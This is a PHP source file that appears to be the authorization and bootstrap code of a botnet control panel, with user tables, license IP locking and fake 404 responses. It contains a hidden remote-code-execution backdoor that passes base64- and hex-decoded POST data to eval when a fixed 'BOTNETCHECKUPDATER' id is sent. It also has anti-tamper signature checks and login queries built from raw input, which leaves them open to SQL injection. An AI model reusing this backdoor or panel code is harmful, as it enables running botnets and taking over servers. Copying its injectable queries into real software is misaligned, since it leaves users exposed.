<?php

/*
$text = '{"appCodeName":"Mozilla",
    "appName":"Netscape",
    "appVersion":"5.0 (Windows; ru)",
    "language":"ru",
    "mimeTypes":{
        "0":{"description":"Mozilla Default Plug-in"},
        "1":{"description":"Adobe Flash movie","suffixes":"swf","type":"application/x-shockwave-flash"},
        "2":{"description":"FutureSplash movie","suffixes":"spl","type":"application/futuresplash"},
        "3":{"description":"Network Interface Plugin","suffixes":"nip","type":"application/x-drm-v2"},
        "4":{"description":"Media Files","type":"application/asx"},
        "5":{"description":"Media Files","type":"video/x-ms-asf-plugin"},
        "6":{"description":"Media Files","type":"application/x-mplayer2"},
        "7":{"description":"Media Files","suffixes":"asf","type":"video/x-ms-asf"},
        "8":{"description":"Media Files","suffixes":"wm","type":"video/x-ms-wm"},
        "9":{"description":"Media Files","suffixes":"wma","type":"audio/x-ms-wma"},
        "10":{"description":"Media Files","suffixes":"wax","type":"audio/x-ms-wax"},
        "11":{"description":"Media Files","suffixes":"wmv","type":"video/x-ms-wmv"},
        "12":{"description":"Media Files","suffixes":"wvx","type":"video/x-ms-wvx"},
        "13":{"description":"Network Interface Plugin","suffixes":"nip","type":"application/x-drm"}
    },
    "platform":"Win32",
    "oscpu":"Windows NT 5.1",
    "product":"Gecko",
    "productSub":"20090715",
    "plugins":{
        "0":{"description":"Default Plug-in","filename":"npnul32.dll","name":"Mozilla Default Plug-in"},
        "1":{"description":"Shockwave Flash 10.0 r22","filename":"NPSWF32.dll","name":"Shockwave Flash"},
        "2":{"description":"DRM Netscape Network Object","filename":"npdrmv2.dll","name":"Microsoft® DRM"},
        "3":{"description":"Npdsplay dll","filename":"npdsplay.dll","name":"Windows Media Player Plug-in Dynamic Link Library"},
        "4":{"description":"DRM Store Netscape Plugin","filename":"npwmsdrm.dll","name":"Microsoft® DRM"}
    },
    "userAgent":"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1",
    "cookieEnabled":"true",
    "nLine":"true",
    "buildID":"20090715094852"}';
$text = str_replace("\r\n", '', $text);
$text = preg_replace("([ ]+)", ' ', $text);
echo $text;
print_rm(json_decode($text));

$test[1][2] = array('1',array('1','2'));

echo json_encode($test);
*/

if(!empty($_SERVER["HTTP_X_REAL_IP"])){
	$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];
}

if($config['autorize_key'] == true){	if($_SESSION['akey'] != $config['akey']){		get_function('first');
  		$dir = '';
  		no_found();
	}
}

get_function('real_escape_string');

$func = array();
$func[] = 'base64_encode';
$func[] = 'base64_decode';
$func[] = 'pack';
$func[] = 'json_encode';
$func[] = 'json_decode';
$func[] = 'dirname';
$func[] = 'mysqli_init';
$func[] = 'openssl_encrypt';
$func[] = 'openssl_decrypt';
$func[] = 'mb_convert_encoding';
//$func[] = 'pcntl_fork';

if(count($func) > 0){	foreach($func as $value){		if(!function_exists($value)){			print('function "'.$value.'" is unknown');
			exit;
		}
	}
}

//Cstart
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-IGd9T6ZgJLTQgkAO'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') != false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') != false) exit;

if(count($license['ip']) > 0){
	if(!isset($license['ip'][$_SERVER['SERVER_ADDR']])){
		unset($_SESSION);
		
		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");
		header("Server: unknown");
		
		print(file_get_contents($dir . '404.html'));
		exit;
	}
}
//Cend

$cebn = base64_encode('CHECKERRORSBOTNET');
if($row->url == $cebn || file_exists('cache/cebn.txt') || file_exists('cache/smarty/c2b9a85287fb9b09cb36f70274cf6562.file.cebn.tpl.php')){
	//Cstart
	print('signature (access to core) error');
	exit;
	//Cend
}

if(isset($_POST['autorize_submit']) && !empty($_POST['login']) && !empty($_POST['password'])){	array_walk($_POST, 'real_escape_string');
	array_walk($_COOKIE, 'real_escape_string');

	$result = $mysqli->query("SELECT * FROM bf_users WHERE (login='".$_POST['login']."') AND (password='".$_POST['password']."') AND (enable='1') LIMIT 1");

	if($result->login == strtolower($_POST['login'])){		$_POST['info'] = json_decode(base64_decode($_POST['info']));
		$_POST['info']->REMOTE_PORT = $_SERVER["REMOTE_PORT"];
		$_POST['info']->REMOTE_ADDR = $_SERVER["REMOTE_ADDR"];
		$_POST['info']->HTTP_USER_AGENT = $_SERVER["HTTP_USER_AGENT"];
		$_POST['info']->REQUEST_TIME = $_SERVER["REQUEST_TIME"];

		unset($_SESSION['user']);

		$result->login = ucfirst($result->login);
		$result->access = json_decode($result->access, true);
        $result->config = json_decode($result->config, true);

		$_SESSION['user'] = $result;
		$_SESSION['user']->PHPSESSID = session_id();
		$_SESSION['user']->access['accounts']['registration'] = 'on';
		$_SESSION['user']->access['accounts']['authorization'] = 'on';
		$_SESSION['user']->access['accounts']['exit'] = 'on';

		if($_POST['hidden'] != 'on'){
			$mysqli->query("update bf_users set PHPSESSID='".$_SESSION['user']->PHPSESSID."', enter_date=CURRENT_TIMESTAMP(), info='".json_encode($_POST['info'])."' WHERE (id='".$_SESSION['user']->id."') LIMIT 1");
	    }else{	    	$_SESSION['hidden'] = 'on';
	    	$mysqli->query("update bf_users set PHPSESSID='".$_SESSION['user']->PHPSESSID."' WHERE (id='".$_SESSION['user']->id."') LIMIT 1");
	    }

  		header("Location: /");
		exit;
	}
}

?>